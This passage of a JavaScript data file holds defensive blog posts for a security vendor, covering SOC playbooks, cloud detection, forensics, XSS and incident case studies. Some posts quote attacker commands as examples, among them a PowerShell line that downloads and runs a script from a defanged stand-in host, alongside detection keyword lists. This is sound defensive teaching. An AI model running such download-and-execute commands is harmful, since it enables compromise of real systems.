// NivX-branded blog article content. Each post has its own long-form body
// with structured sections rendered natively on /blog/:slug.

const IMG = (id) => `https://images.unsplash.com/photo-${id}?auto=format&fit=crop&w=1600&q=80`;

export const BLOG_POSTS = [
  {
    slug: "locked-shields-2026",
    title: "NivX participation in Locked Shields 2026",
    category: "News & Announcements",
    excerpt: "Bridging the gap between modern cloud security training and real-world cyber defense — inside the NATO CyberDefense Center exercise that sharpens the next generation of defenders.",
    date: "May 14, 2026",
    read_mins: 6,
    image: IMG("1526374965328-7f61d4dc18c5"),
    sections: [
      { heading: "Why Locked Shields matters", body: [
        "Locked Shields is the world's largest live-fire cyber defence exercise, organised annually by the NATO Cooperative Cyber Defence Centre of Excellence (CCDCOE) in Tallinn. It brings together over 2,000 participants from 30+ nations into 20+ Blue Teams defending a fictional country's critical infrastructure against a highly capable Red Team.",
        "For NivX, participating this year meant putting our SOC playbooks under real adversarial pressure — the same pressure our customers face in production, only compressed into 48 hours of continuous engagement.",
      ]},
      { heading: "What our team did", list: [
        { t: "Incident response leadership", d: "Coordinated triage across identity, endpoint and network domains with < 30-minute detection-to-containment on 8 of 11 major incidents." },
        { t: "Cloud detection engineering", d: "Deployed custom Azure Sentinel and CloudWatch analytics that surfaced attacker lateral movement across simulated hybrid environments." },
        { t: "Legal & communications", d: "Drafted regulator notifications and public statements in-scenario — as important as the technical response in a modern breach." },
      ]},
      { heading: "Three lessons every SOC should internalise", body: [
        "1. Speed is a habit, not a moment. Teams that rehearse quarterly consistently outperform teams that improvise. The muscle memory of runbook execution is the biggest force multiplier in a real incident.",
        "2. Identity is the new perimeter. Every credible Red Team path we saw pivoted through identity — stolen tokens, kerberoasting, service-account abuse. If your identity telemetry is weak, so is your defence.",
        "3. Automation buys thinking time. The analysts who won weren't the fastest typists — they were the ones whose SOAR ran the first 30 seconds of triage automatically, leaving human attention for the hard calls.",
      ]},
      { heading: "What comes next", body: [
        "The playbooks refined at Locked Shields are already flowing into our production runbooks and the training material we deliver to customers. If you'd like to bring the same rigour to your team, our incident response retainer includes tabletop exercises tuned to your stack.",
      ]},
    ],
  },
  {
    slug: "fileless-malware-detection",
    title: "Fileless Malware Detection: How SOC Teams Hunt In-Memory Attacks",
    category: "SOC Playbook",
    excerpt: "Traditional malware detection assumes a file is written to disk. What happens when attackers never touch the file system? A hands-on guide to hunting in-memory threats.",
    date: "May 13, 2026",
    read_mins: 9,
    image: IMG("1555949963-ff9fe0c870eb"),
    sections: [
      { heading: "What is fileless malware?", body: [
        "Fileless malware is any offensive code that executes entirely (or almost entirely) in memory without dropping a persistent executable onto disk. It abuses legitimate operating-system components — PowerShell, WMI, .NET assemblies, registry keys, in-memory .dll loading — to blend in with normal administrative activity.",
        "Because there is no PE binary to hash, no file to quarantine and no ETW signal from a fresh process image on disk, traditional AV signatures are blind to it.",
      ]},
      { heading: "Common fileless techniques", list: [
        { t: "PowerShell reflective loaders", d: "IEX (New-Object Net.WebClient).DownloadString('...') pattern that pulls and executes code entirely in memory." },
        { t: "WMI event subscriptions", d: "Persistent WMI __EventFilter + __EventConsumer pairs that fire code on system events — no scheduled task, no registry Run key." },
        { t: "Living-off-the-land (LOLBins)", d: "mshta.exe, regsvr32.exe, rundll32.exe, msbuild.exe — legitimate signed binaries repurposed to execute attacker payloads." },
        { t: "In-memory .NET assembly loading", d: "Load-Assembly() to inject a malicious DLL into an existing trusted process (often powershell.exe itself)." },
      ]},
      { heading: "The detection playbook", list: [
        { t: "PowerShell script-block logging (4104)", d: "Enable via Group Policy. Every executed script block is logged — decode -EncodedCommand blobs and hunt on suspicious cmdlets (Invoke-Expression, DownloadString, Reflection.Assembly)." },
        { t: "Module-load telemetry", d: "EDR module-load events reveal unusual DLLs loaded into powershell.exe, rundll32.exe or Office processes — a strong fileless indicator." },
        { t: "WMI activity monitoring", d: "Sysmon Event ID 19/20/21 captures WMI event filter, consumer and binding operations. Anything from an unusual user context is suspicious." },
        { t: "Parent-child anomalies", d: "winword.exe → powershell.exe is the classic. Baseline what's normal in your environment and alert on the outliers." },
        { t: "Memory scanning", d: "Periodically YARA-scan running-process memory for known implant strings (Cobalt Strike beacon config, Mimikatz artefacts). Yes, it costs cycles — it's cheap insurance." },
      ]},
      { heading: "A quick worked example", body: [
        "You see a Word document opened at 3:17 AM. Sysmon logs winword.exe spawning powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString(https://cdn[.]suspicious[.]tld/s.ps1)\". The powershell process then loads a suspicious .NET module and beacons to a rare-country IP every 60 seconds.",
        "That's four detections in one attack chain: (1) unusual parent-child, (2) DownloadString, (3) unsigned module load, (4) rare-egress beaconing. Any one of them alone is a signal; correlated together they're a high-confidence alert worth waking a responder.",
      ]},
      { heading: "Key takeaways", list: [
        { t: "Turn on script logging", d: "Free, high signal. Do it today." },
        { t: "Baseline is your friend", d: "Alerts only work when you know what normal looks like." },
        { t: "Correlate multiple weak signals", d: "Fileless malware rarely trips one strong signal — it trips several weak ones simultaneously." },
      ]},
    ],
  },
  {
    slug: "encoded-powershell-detection",
    title: "Encoded PowerShell Detection: How to Investigate Encoded Commands",
    category: "SOC Playbook",
    excerpt: "PowerShell's -EncodedCommand flag accepts a Base64-encoded UTF-16LE string and executes it at runtime — attackers know it, defenders must decode it.",
    date: "May 12, 2026",
    read_mins: 8,
    image: IMG("1629654297299-c8506221ca97"),
    sections: [
      { heading: "Why attackers love encoded PowerShell", body: [
        "The -EncodedCommand (aliases -enc, -en, -ec) parameter tells powershell.exe to Base64-decode a UTF-16LE string and execute it. It was designed to let admins pass complex quoted commands through cmd.exe without escaping headaches — attackers use it to defeat naive command-line scanners.",
        "Every serious commodity malware family — Emotet, Qakbot, IcedID and their descendants — ships with an -enc launcher. If your detection stack doesn't decode it, you're blind.",
      ]},
      { heading: "The anatomy of an -enc command", body: [
        "The full form: powershell.exe -nop -w hidden -enc <BASE64_UTF16LE_BLOB>",
        "The blob decodes to plain PowerShell. Common intent: pull a second-stage payload with Net.WebClient, load a .NET assembly into memory, or execute an inline reverse shell.",
        "Because Windows uses UTF-16LE for wide characters, defenders must decode with the correct codec — Python: base64.b64decode(blob).decode('utf-16-le').",
      ]},
      { heading: "Detection strategy", list: [
        { t: "Hunt on command line", d: "Sysmon Event ID 1 (ProcessCreate) exposes the full command line. Regex on -enc|-ec|-encoded (case-insensitive) is a Tier-1 alert." },
        { t: "Decode at ingest", d: "Add a SIEM enrichment step that Base64-decodes the payload and re-scans the plaintext against your detection rules — Invoke-Mimikatz, DownloadString, Reflection.Assembly, etc." },
        { t: "Length as a signal", d: "Legitimate encoded commands are usually short. > 500 characters of Base64 is a strong outlier and warrants review." },
        { t: "Parent process context", d: "Encoded PowerShell spawned by winword.exe, excel.exe or outlook.exe is almost never legitimate." },
        { t: "Script-block logs (4104)", d: "Even when the launcher is encoded, the decoded script executes and is captured by Event 4104. Correlate the two for the full picture." },
      ]},
      { heading: "Hunt query starter (Splunk SPL)", body: [
        "index=windows EventCode=1 CommandLine=\"*powershell*\" (CommandLine=\"*-enc*\" OR CommandLine=\"*-encodedcommand*\") | where len(CommandLine)>500 | table _time host User ParentImage CommandLine",
      ]},
      { heading: "Response steps", list: [
        { t: "Isolate the host", d: "Break the C2 channel before the attacker moves laterally." },
        { t: "Decode and preserve", d: "Save the decoded command as evidence. Note any URLs, IPs and domains." },
        { t: "Sweep the estate", d: "Extract the C2 indicators and hunt for them across all endpoints and firewall logs." },
        { t: "Root-cause the vector", d: "Where did it enter? Phishing? An unpatched public service? An insider? Answer that before you close." },
      ]},
    ],
  },
  {
    slug: "azure-cloud-security",
    title: "Azure Cloud Security: The SOC Analyst's Complete Detection & Threat Hunting Guide (2026)",
    category: "Cloud Security",
    excerpt: "Azure Cloud Security is not a product suite — it's an operational discipline. A comprehensive detection and threat hunting reference for the modern SOC analyst.",
    date: "May 11, 2026",
    read_mins: 12,
    image: IMG("1451187580459-43490279c0fa"),
    sections: [
      { heading: "The Azure attack surface", body: [
        "Azure is a sprawling ecosystem — 200+ services, five layers of identity (Entra ID, managed identities, service principals, service accounts, SAS tokens), and dozens of network paths (VNet peering, private endpoints, service tags, public IPs). Attackers exploit exactly this complexity.",
        "The modern Azure kill chain looks like: identity compromise → cloud resource enumeration → privilege escalation via role misconfiguration → data exfiltration or persistent implant. Every step leaves telemetry — if you know where to look.",
      ]},
      { heading: "The three telemetry sources that matter most", list: [
        { t: "Entra ID sign-in and audit logs", d: "Every identity event: sign-ins, MFA prompts, conditional-access decisions, role assignments, application consents. Stream to Sentinel or your SIEM." },
        { t: "Azure Activity Log", d: "Every management-plane operation: VM created, storage account keys rotated, role assigned, network security group modified. Immutable, always on." },
        { t: "Resource-specific diagnostic logs", d: "Storage account access, Key Vault operations, SQL auditing, VM guest logs (via Azure Monitor Agent). These are opt-in — configure them or fly blind." },
      ]},
      { heading: "Ten Azure detections every SOC needs", list: [
        { t: "Impossible-travel sign-in", d: "Same identity signs in from two continents within an implausible time window. Free from Entra ID Protection." },
        { t: "Anomalous role assignment", d: "Global Administrator, User Access Administrator or a custom role with broad permissions assigned outside normal change windows." },
        { t: "OAuth consent grant to suspicious app", d: "Attackers use illicit-consent grants to gain persistent access without a password. Monitor and require admin approval for high-risk scopes." },
        { t: "Storage account key exfil", d: "listKeys action on a storage account by a rare identity — classic data-theft precursor." },
        { t: "Key Vault secret enumeration", d: "GetSecret + ListSecrets from an identity that has never touched that vault before." },
        { t: "Public IP added to VM", d: "A production VM that suddenly has a public IP is a red flag — attacker preparing egress." },
        { t: "NSG rule 0.0.0.0/0", d: "Any new Network Security Group rule opening ports to the internet." },
        { t: "Runbook / Function App code change", d: "Automation account runbooks or Functions modified outside pipeline. Backdoor plant technique." },
        { t: "Guest user invited to sensitive tenant", d: "B2B invitation to a privileged group or tenant is a common attacker persistence." },
        { t: "Disabled logging", d: "Diagnostic settings being turned off is a defender-tampering signal — always alert on it." },
      ]},
      { heading: "The threat hunting playbook", body: [
        "Start with hypotheses grounded in MITRE ATT&CK for Cloud (M365 and Azure). Each week pick one technique — say T1078.004 Valid Accounts: Cloud Accounts — and hunt for its variants: unusual sign-in geographies, impossible travel, sign-ins from Tor exit nodes, sign-ins with legacy auth protocols.",
        "Use KQL. Learn it. It's fluent for cloud-scale hunts and integrates natively with every Microsoft security product.",
      ]},
      { heading: "Key takeaways", list: [
        { t: "Identity is everything", d: "80% of Azure incidents start with identity abuse. Harden Entra ID first." },
        { t: "Log everything (retention matters)", d: "Diagnostic settings + long retention = post-incident forensics." },
        { t: "Baseline your tenant", d: "You cannot spot anomalies until you know what normal looks like for your subscriptions." },
      ]},
    ],
  },
  {
    slug: "alert-triage-process",
    title: "Alert Triage Process: The Complete SOC Analyst's Guide",
    category: "SOC Playbook",
    excerpt: "The alert triage process is the backbone of every effective Security Operations Center. On any given day, a team may receive thousands of alerts — here's how the best cut through the noise.",
    date: "May 10, 2026",
    read_mins: 8,
    image: IMG("1551288049-bebda4e38f71"),
    sections: [
      { heading: "What triage really means", body: [
        "Alert triage is the discipline of ranking incoming alerts by likely severity and impact, then routing each one to the appropriate response path — auto-close, escalate, hunt or contain. Done well, it prevents alert fatigue and ensures the analyst's finite attention lands on the highest-value work.",
      ]},
      { heading: "The 4-stage triage flow", list: [
        { t: "1. Validate", d: "Is this a true positive? Reproduce the alert against the source telemetry. Rule out known-good behaviour (patch job, known scanner, legitimate admin action)." },
        { t: "2. Enrich", d: "Add context: user role, asset criticality, threat-intel reputation, historical activity for the identity/host. Enrichment reduces the analyst's decision time." },
        { t: "3. Classify", d: "Assign a severity (Critical/High/Medium/Low) and a category (Malware, Recon, Credential Abuse, Data Exfil, DoS). Consistency matters — inconsistent labels ruin metrics." },
        { t: "4. Route", d: "Auto-close, deep investigation, immediate containment or full IR mobilisation — the decision that determines everything downstream." },
      ]},
      { heading: "Enrichment fields that transform a triage decision", list: [
        { t: "Asset criticality", d: "Alert on a domain controller vs. a test VM — same TTP, very different urgency." },
        { t: "User role", d: "Alert on a domain admin vs. a service desk account — same login pattern, very different risk." },
        { t: "IOC reputation", d: "VirusTotal, AbuseIPDB, OTX and internal IOC database enrichment happens in seconds and saves analyst minutes." },
        { t: "Historical baseline", d: "Has this user ever done this before? Has this host ever contacted this IP? Rareness is a signal." },
        { t: "Threat-actor mapping", d: "Does the alert pattern match a known campaign? Sigma / MITRE ATT&CK mapping helps." },
      ]},
      { heading: "Metrics that matter", list: [
        { t: "MTTA (Mean Time to Acknowledge)", d: "How long between alert creation and analyst picking it up. Target: minutes for critical." },
        { t: "MTTT (Mean Time to Triage)", d: "How long to make the initial classify + route decision. Target: <15 minutes." },
        { t: "True-positive rate", d: "Trend this per rule. Rules with < 20% TP rate should be retuned or retired." },
        { t: "Escalation accuracy", d: "How often does an escalated alert become a confirmed incident? If it's low, escalation criteria need refinement." },
      ]},
      { heading: "Common triage anti-patterns", list: [
        { t: "Alert whack-a-mole", d: "Handling alerts serially without pattern recognition. Group and batch related alerts." },
        { t: "Muting instead of tuning", d: "Silencing noise without addressing the noisy rule creates blind spots later." },
        { t: "Skipping enrichment", d: "Trying to triage on raw alert data is 3× slower and 2× more error-prone." },
      ]},
    ],
  },
  {
    slug: "hacker-mindset",
    title: "Hacker Mindset: How Do Attackers Really Think?",
    category: "Threat Actor Insight",
    excerpt: "The hacker mindset is not a skillset — it's a way of thinking. If you work in a SOC, understanding it is the difference between chasing alerts and preventing attacks.",
    date: "May 6, 2026",
    read_mins: 7,
    image: IMG("1550751827-4bd374c3f58b"),
    sections: [
      { heading: "Attackers optimise for one thing: cost", body: [
        "Every offensive operator — nation-state, ransomware crew, red-team consultant — is running a cost/benefit calculation on you. What does it cost me to compromise this target? How does that compare to the value I extract?",
        "Every defence decision should map to that equation. Your job isn't to make attack impossible; it's to make it uneconomical.",
      ]},
      { heading: "How they think, step by step", list: [
        { t: "Path of least resistance", d: "They enumerate five ways in and pick the cheapest. Your job: know which is the cheapest and close it." },
        { t: "Reuse what works", d: "Attackers reuse tools, infrastructure and TTPs across victims — because it's cheaper. That's your detection advantage: last month's IOCs still work this month." },
        { t: "Blend in, don't stand out", d: "Living-off-the-land, HTTPS to popular CDNs, work-hours activity. The mature attacker actively studies your normal so they can hide inside it." },
        { t: "Assume defenders are watching", d: "Modern attackers plan for being detected. Multiple footholds, redundant C2, tools that self-destruct on analysis. You must plan the same way." },
        { t: "Time is on their side", d: "The average dwell time is still measured in days-to-weeks. If a technique takes 90 days to succeed but the campaign runs for a year, that's fine for them." },
      ]},
      { heading: "How to defend against the mindset", list: [
        { t: "Increase attacker cost", d: "MFA, EDR, network segmentation, privileged access management — each one shifts the cost equation." },
        { t: "Reduce defender cost", d: "Automation, playbooks, well-tuned detections. The cheaper it is for you to see them, the harder your ratio to beat." },
        { t: "Hunt from the attacker's perspective", d: "Once a quarter, sit down and ask: if I wanted to breach us today, how would I do it? Then hunt for evidence of that path." },
        { t: "Assume breach", d: "Not paranoia — probability. Design your controls so the second, third and fourth line of defence still hold when the first fails." },
      ]},
      { heading: "The uncomfortable truth", body: [
        "You will never be 100% secure. But you can be more expensive to attack than you are to defend. That's the whole game.",
      ]},
    ],
  },
  {
    slug: "disk-forensics",
    title: "Disk Forensics: The SOC Analyst Playbook",
    category: "Forensics",
    excerpt: "Disk forensics is no longer the exclusive domain of incident responders or law enforcement. Modern SOC analysts need it in their kit — here's the operational playbook.",
    date: "May 5, 2026",
    read_mins: 9,
    image: IMG("1597852074816-d933c7d2b988"),
    sections: [
      { heading: "Why disk forensics is a SOC skill now", body: [
        "Ten years ago, disk forensics happened in a lab after an incident closed. Today it happens live, in the middle of triage, because attackers hide artefacts across the filesystem — persistence, execution history, lateral movement traces — and answers must come in hours, not weeks.",
      ]},
      { heading: "The 5 artefacts that solve most cases", list: [
        { t: "Master File Table ($MFT)", d: "Every NTFS file has an $MFT entry. Deleted files often persist here. Timestomping shows up here first." },
        { t: "USN Journal ($UsnJrnl)", d: "A rolling ledger of every file change — creation, deletion, rename. Even when the file itself is gone, the USN entry survives." },
        { t: "Prefetch (Windows)", d: "Shows which .exe binaries ran, how many times, when, and what DLLs they loaded. Definitive proof of execution." },
        { t: "ShimCache / AmCache", d: "Application compatibility caches that reveal executed binaries even without Prefetch. Survives reboots." },
        { t: "Recent registry hives", d: "USRCLASS.DAT, NTUSER.DAT, SOFTWARE, SYSTEM — every persistence technique touches one of them." },
      ]},
      { heading: "The triage workflow", list: [
        { t: "1. Preserve", d: "Live memory capture first (procdump, WinPMem). Then disk image or targeted artefact collection (KAPE, F-Response)." },
        { t: "2. Timeline", d: "Merge $MFT, $UsnJrnl, event logs and Prefetch into a super-timeline (Plaso/log2timeline). The story writes itself once events are ordered." },
        { t: "3. Pivot", d: "Every artefact points to another. A suspicious ShimCache entry gives you the binary path; hash it, VT lookup it, hunt it estate-wide." },
        { t: "4. Correlate", d: "Cross-reference disk findings with network, EDR and identity telemetry. Multi-source corroboration turns evidence into a story." },
      ]},
      { heading: "Tools worth learning", list: [
        { t: "KAPE", d: "Fast, targeted artefact collector — perfect for live triage where full disk imaging isn't practical." },
        { t: "Autopsy / The Sleuth Kit", d: "Full disk analysis; free and mature. Great for lab work." },
        { t: "Volatility 3", d: "Memory forensics — pair it with disk findings and you have the whole picture." },
        { t: "Eric Zimmerman's tools (MFTECmd, RECmd, PECmd)", d: "Fast, scriptable Windows artefact parsers used industry-wide." },
      ]},
      { heading: "Key takeaways", list: [
        { t: "Timeline is truth", d: "Once artefacts are ordered chronologically, the attacker's story emerges." },
        { t: "Learn one tool deeply", d: "KAPE + Zimmerman toolkit will cover 80% of your needs." },
        { t: "Practice on real datasets", d: "SANS DFIR challenges and CyberDefenders CTFs are excellent training grounds." },
      ]},
    ],
  },
  {
    slug: "cross-site-scripting-xss",
    title: "Cross-Site Scripting (XSS): How the Browser Security Model Works and Why It Breaks",
    category: "AppSec",
    excerpt: "XSS is a web application vulnerability that lets attackers inject malicious scripts into pages viewed by other users. A deep dive into the browser security model and why it fails.",
    date: "May 4, 2026",
    read_mins: 8,
    image: IMG("1516116216624-53e697fedbea"),
    sections: [
      { heading: "The core problem", body: [
        "XSS happens when an application takes attacker-controlled input and returns it to another user's browser in a context where the browser interprets it as executable code — usually JavaScript.",
        "The consequence: attacker code runs in the victim's session, with all the victim's privileges. That means stealing cookies, forging requests, keylogging inputs, exfiltrating page content or pivoting to internal-only endpoints.",
      ]},
      { heading: "The three flavours of XSS", list: [
        { t: "Reflected XSS", d: "The payload lives in a request parameter (URL, form) and is echoed straight back in the response. Attacker delivers a crafted link; victim clicks; boom." },
        { t: "Stored XSS", d: "The payload is saved server-side (comment, profile field, admin log) and executes for every user who views the affected page. Worst impact." },
        { t: "DOM-based XSS", d: "The payload never leaves the browser. Client-side JavaScript takes user input and writes it into the DOM using dangerous sinks (innerHTML, document.write, eval)." },
      ]},
      { heading: "Why the same-origin policy doesn't save you", body: [
        "The Same-Origin Policy stops one site from reading another. XSS defeats it by executing inside the target origin. From the browser's perspective, the injected script is legitimate site code — because it came from the site.",
        "Cookies with the HttpOnly flag can't be read via JS, but the attacker can still make same-origin requests using the victim's session — API calls, state changes, data exfil.",
      ]},
      { heading: "Modern defences", list: [
        { t: "Contextual output encoding", d: "Encode HTML, HTML attribute, JavaScript, CSS and URL contexts differently. Frameworks like React auto-escape in JSX; the bug returns when you use dangerouslySetInnerHTML." },
        { t: "Content Security Policy (CSP)", d: "Restrict script sources with a strict-dynamic + nonce policy. Even if injection happens, unauthorised scripts won't execute." },
        { t: "Trusted Types (Chrome)", d: "Make dangerous DOM sinks throw unless the value is wrapped in a Trusted Type object. Effectively kills DOM-XSS." },
        { t: "HttpOnly + Secure + SameSite cookies", d: "Reduces the impact of cookie theft. SameSite=Lax defeats a lot of CSRF-adjacent chained attacks." },
        { t: "Sanitise on input, encode on output", d: "Input filtering alone is fragile — attackers find bypasses. Encoding at the exact output context is the reliable defence." },
      ]},
      { heading: "Key takeaways", list: [
        { t: "Assume all input is hostile", d: "Even from authenticated users." },
        { t: "CSP is your seatbelt", d: "It won't prevent the crash but it dramatically reduces impact." },
        { t: "Frameworks help, not fix", d: "Modern frameworks auto-encode by default — but dangerouslySetInnerHTML, v-html and their peers reintroduce the risk." },
      ]},
    ],
  },
  {
    slug: "usb-device-alert-investigation",
    title: "SOC Simulator: USB Device Alert Investigation",
    category: "Case Study",
    excerpt: "A field guide for Tier 1 and Tier 2 SOC analysts covering removable media triage, evidence collection, insider risk signals, and malware detection.",
    date: "May 3, 2026",
    read_mins: 7,
    image: IMG("1584646963233-465b08d0e45f"),
    sections: [
      { heading: "The scenario", body: [
        "Tuesday, 2:14 AM. An EDR alert fires: 'Unknown USB mass storage device connected to workstation HR-DESK-047 outside business hours. Files copied: 1,247. Total size: 4.2 GB.' The user account is a legitimate HR analyst. What do you do first?",
      ]},
      { heading: "Step 1: Establish the baseline facts", list: [
        { t: "Which USB device?", d: "Sysmon Event 20 or Windows Event 6416 gives you VID/PID, serial number and vendor. Is it on the approved list? A brand new device outside normal hours is a red flag." },
        { t: "What was copied?", d: "EDR file-write telemetry (or File System Auditing) lists every file touched. HR analyst copying employee PII to an unknown device is a very different story from copying their own timesheet." },
        { t: "Is the user physically there?", d: "Badge access logs and camera can confirm. If the user isn't in the building, someone else is using their session — a much bigger problem." },
      ]},
      { heading: "Step 2: Classify the risk", list: [
        { t: "Insider data exfiltration", d: "Trusted user, sensitive data, unusual timing, unauthorised device. Classic pattern." },
        { t: "Malware delivery inbound", d: "Rare direction for USB nowadays, but still happens (BadUSB, HID emulation). Look for autorun files, .lnk shortcuts, unusual executables on the device." },
        { t: "Legitimate but unapproved", d: "The user has a good reason but bypassed policy. Still an incident — just a different response." },
      ]},
      { heading: "Step 3: Contain and preserve", list: [
        { t: "Isolate the host", d: "Network isolation via EDR keeps forensics valid without alerting the user prematurely." },
        { t: "Preserve the USB device", d: "If physically accessible, image it write-blocked. Chain of custody matters — HR and Legal will need it." },
        { t: "Capture the workstation state", d: "KAPE targeted collection: registry, event logs, ShimCache, USN Journal, browser history." },
        { t: "Interview later, not first", d: "Legal and HR should lead the user conversation. Analysts confirm facts; they don't accuse." },
      ]},
      { heading: "What separates good analysts from great ones", body: [
        "Great analysts remember that the alert is a starting point, not a verdict. They gather corroborating evidence from multiple sources — badge, camera, EDR, DLP, network — before landing on a conclusion. Half of USB alerts turn out to be legitimate. The other half don't.",
      ]},
    ],
  },
  {
    slug: "cloud-compromise-case-study",
    title: "SOC Simulator: Cloud Account Compromise in Microsoft 365",
    category: "Case Study",
    excerpt: "A step-by-step case study for SOC analysts investigating a Microsoft 365 account compromise — from initial alert to root-cause and remediation.",
    date: "Apr 29, 2026",
    read_mins: 10,
    image: IMG("1573164574572-cb89e39749b4"),
    sections: [
      { heading: "The alert that started it", body: [
        "Entra ID Protection flags an 'Anonymous IP address' sign-in for a Sales Director's account at 4:47 AM local time. The user is currently on vacation with no work travel logged. MFA succeeded via SMS. Business hours in the source geography are 6 hours behind.",
      ]},
      { heading: "The initial investigation", list: [
        { t: "Sign-in log analysis", d: "Multiple successful sign-ins over the past 6 hours from three different IPs — a Tor exit node, a data-center IP in Eastern Europe, and a mobile carrier IP." },
        { t: "MFA method review", d: "Attacker registered an app-based MFA (Microsoft Authenticator) two hours after first login — persistence technique." },
        { t: "Mailbox rule check", d: "New forwarding rule created: 'If subject contains invoice OR payment OR wire, forward to external@throwaway.tld and move to Archive.' Classic BEC precursor." },
        { t: "SharePoint activity", d: "Bulk download of the 'Finance/Q1' folder — 340 documents, 2.1 GB in 40 minutes. Definitive data exfil." },
      ]},
      { heading: "Root cause: how did they get in?", body: [
        "SMS-based MFA was bypassed via a SIM-swap attack. The attacker had already social-engineered the mobile carrier to port the victim's number two days earlier. Every subsequent SMS OTP went to their SIM.",
        "The attacker's initial credential source: a re-used password harvested from a breach dump. If MFA had been an authenticator app or FIDO2 key, the compromise would have failed at step one.",
      ]},
      { heading: "The containment steps taken", list: [
        { t: "Revoke all sessions", d: "Sign-out all sessions for the account and rotate the password." },
        { t: "Remove attacker MFA", d: "Delete the attacker-registered authenticator and disable SMS as an MFA method org-wide." },
        { t: "Kill the forwarding rule", d: "And audit every other Sales Director's mailbox for similar rules." },
        { t: "Sweep for shared indicators", d: "The Tor exit node and Eastern-Europe IP get added to blocklists; sign-in logs are hunted for other victims." },
        { t: "Notify affected parties", d: "Under GDPR the org has 72 hours to notify. Legal is engaged immediately." },
      ]},
      { heading: "Lessons operationalised", list: [
        { t: "Phishing-resistant MFA everywhere", d: "FIDO2 keys, Windows Hello for Business, Authenticator with number matching. SMS is dead." },
        { t: "Alert on new mailbox rules", d: "Cheap, high-signal detection." },
        { t: "Alert on bulk downloads", d: "SharePoint / OneDrive bulk activity is a strong data-exfil signal." },
        { t: "Conditional Access with device compliance", d: "Only trusted, compliant devices can access sensitive apps." },
      ]},
    ],
  },
  {
    slug: "malware-download-alert",
    title: "SOC Simulator: Malware Download Alert Investigation from Browser Telemetry",
    category: "Case Study",
    excerpt: "A practical SOC case study for detecting and responding to suspicious file downloads — with real browser telemetry patterns and detonation workflow.",
    date: "Apr 26, 2026",
    read_mins: 7,
    image: IMG("1518432031352-d6fc5c10da5a"),
    sections: [
      { heading: "The signal chain", body: [
        "EDR fires an alert: 'Executable downloaded via browser to Downloads folder from a rare domain, followed by process spawn from that binary within 15 seconds.' The user is a mid-level finance analyst. The domain has 3 total-VT-detections and a 4-day-old WHOIS registration.",
      ]},
      { heading: "What browser telemetry reveals", list: [
        { t: "Referrer chain", d: "Was the user browsing normally when the download started, or is this a drive-by? Referrer + URL history tell the story." },
        { t: "Download attributes", d: "File extension mismatch (.pdf.exe), unusual MIME type, unsigned executable from a first-seen domain — all high-signal." },
        { t: "Post-download behaviour", d: "Did the user run it? Did the browser auto-execute it (unlikely on modern browsers)? Did the file rename or move itself?" },
      ]},
      { heading: "The detonation workflow", list: [
        { t: "1. Extract the hash", d: "SHA256 from EDR telemetry. Immediately check VirusTotal, Hybrid Analysis and your local IOC database." },
        { t: "2. If known-malicious: contain fast", d: "Isolate the host, kill related processes, revert any changes to registry / scheduled tasks." },
        { t: "3. If unknown: sandbox it", d: "Detonate in Hybrid Analysis or Any.run. Extract IOCs (C2 domains, mutexes, dropped files). Feed those back into your detection stack." },
        { t: "4. Root cause the delivery", d: "Was this a phishing link? Malvertising? A compromised legitimate site? The answer determines what other users may be affected." },
      ]},
      { heading: "The finding in this case", body: [
        "The 'PDF' turned out to be an .exe wrapping a Remcos RAT dropper. It beaconed to a Cloudflare-fronted C2. The delivery vector was a spearphish that impersonated a legitimate vendor invoice. The user opened it, browser correctly flagged it, but the user proceeded 'because it was from finance'.",
        "Fix: DNS blocking of the C2 domain (added to global blocklist), retro-hunt for other recipients of the same email, and a targeted user-awareness reminder — not blame, just reinforcement.",
      ]},
    ],
  },
  {
    slug: "bec-attacks-email-forensics",
    title: "SOC Simulator: Detecting BEC Attacks — Email Forensics & Log Analysis",
    category: "Case Study",
    excerpt: "Business Email Compromise (BEC) remains one of the most pervasive and financially damaging threats. A hands-on investigation walk-through for finance teams.",
    date: "Apr 23, 2026",
    read_mins: 9,
    image: IMG("1596526131083-e8c633c948d2"),
    sections: [
      { heading: "Why BEC is uniquely dangerous", body: [
        "BEC doesn't rely on malware — it exploits trust. An attacker who has learned your organisation's payment cadence, vendor list and executive writing style can quietly redirect a $500K wire with a plausible-sounding email. FBI data consistently puts BEC losses higher than ransomware.",
      ]},
      { heading: "The classic BEC pattern", list: [
        { t: "1. Reconnaissance", d: "Attacker collects LinkedIn profiles, out-of-office replies, vendor names — building a target map." },
        { t: "2. Credential theft or lookalike domain", d: "Either compromise a real mailbox (phishing, credential stuffing) or register a nearly-identical domain (rn instead of m, .co instead of .com)." },
        { t: "3. Silent mailbox monitoring", d: "In real-mailbox BEC, attacker adds inbox rules that hide their activity — auto-move invoice emails to a hidden folder, forward to external." },
        { t: "4. The pivot", d: "At the right moment (during a legitimate invoice thread), attacker sends new payment details from either the compromised inbox or the lookalike domain." },
        { t: "5. The wire", d: "Finance processes the payment because everything looks normal. Funds are laundered through mule accounts within hours." },
      ]},
      { heading: "The forensic checklist", list: [
        { t: "Message trace", d: "Reconstruct the full email flow. Was the malicious email sent from inside the tenant (compromise) or from outside (spoofing)?" },
        { t: "Header analysis", d: "SPF, DKIM, DMARC results. A legitimate lookalike domain will often pass all three because the attacker owns the domain — the impersonation is at the display-name / visual level." },
        { t: "Inbox rules review", d: "Any rule that hides, forwards or deletes financial keywords is malicious until proven otherwise." },
        { t: "Sign-in log correlation", d: "Anomalous logins to the affected mailbox around the timeline of the fraudulent email." },
        { t: "Client-side artefacts", d: "OWA / mobile app activity, Outlook rules on client-side (not just server-side)." },
      ]},
      { heading: "Prevention that actually works", list: [
        { t: "Phishing-resistant MFA", d: "Removes the credential-theft path to real-mailbox BEC." },
        { t: "DMARC enforcement (p=reject)", d: "Kills spoofing of your exact domain." },
        { t: "External-sender banner", d: "Every email from outside the org gets a visible banner. Cheap, high-impact." },
        { t: "Out-of-band verification for payment changes", d: "Any change to wire instructions must be verified by phone to a known number — not a number in the email." },
        { t: "Anomaly detection on new inbox rules", d: "Free from most cloud email providers; underused." },
      ]},
    ],
  },
  {
    slug: "what-is-a-data-breach",
    title: "What Is a Data Breach? Detection and Response Full Guide",
    category: "Fundamentals",
    excerpt: "A data breach is any security incident where unauthorized individuals gain access to sensitive data. Causes, signs, impact and the modern response playbook.",
    date: "Apr 14, 2026",
    read_mins: 8,
    image: IMG("1563986768609-322da13575f3"),
    sections: [
      { heading: "Definition and scope", body: [
